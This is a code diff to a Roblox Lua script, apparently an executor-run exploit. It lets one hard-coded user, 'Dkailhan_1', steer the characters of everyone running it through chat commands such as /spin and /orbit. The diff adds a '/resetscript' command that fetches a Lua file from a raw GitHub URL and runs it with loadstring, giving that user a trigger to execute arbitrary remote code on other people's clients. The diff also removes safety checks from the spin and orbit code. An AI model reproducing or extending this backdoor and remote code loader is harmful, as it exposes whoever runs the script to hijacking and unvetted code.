@@ -33,25 +33,21 @@ OnMessageEvent.OnClientEvent:Connect(function(data)
             SayMessageRequest:FireServer(toSay, "All")
         elseif string.sub(message, 1, 5) == "/spin" and player == "Dkailhan_1" then
             local numbertospin = tonumber(string.sub(message, 7)) or 100
-            if hrp then
-                for i = 1, numbertospin do
-                    hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(36), 0)
-                    task.wait()
-                end
+            for i = 1, numbertospin do
+                hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(36), 0)
+                task.wait()
             end
+        elseif message == "/resetscript" and player == "Dkailhan_1" then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/piggy.lua"))()
         elseif string.sub(message, 1, 6) == "/orbit" and player == "Dkailhan_1" then
             local radius = tonumber(string.sub(message, 8)) or 10
             if not orbiting then
                 orbiting = true
-                if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
-                    local ownerHRP = owner.Character.HumanoidRootPart
-                    orbitConnection = game:GetService("RunService").RenderStepped:Connect(function()
-                        if hrp and ownerHRP then
-                            local angle = tick() * math.rad(90)
-                            hrp.CFrame = ownerHRP.CFrame * CFrame.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
-                        end
-                    end)
-                end
+                local ownerHRP = owner.Character.HumanoidRootPart
+                orbitConnection = game:GetService("RunService").RenderStepped:Connect(function()
+                    local angle = tick() * math.rad(90)
+                    hrp.CFrame = ownerHRP.CFrame * CFrame.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
+                end)
             end
         elseif message == "/unorbit" and player == "Dkailhan_1" then
             if orbiting then
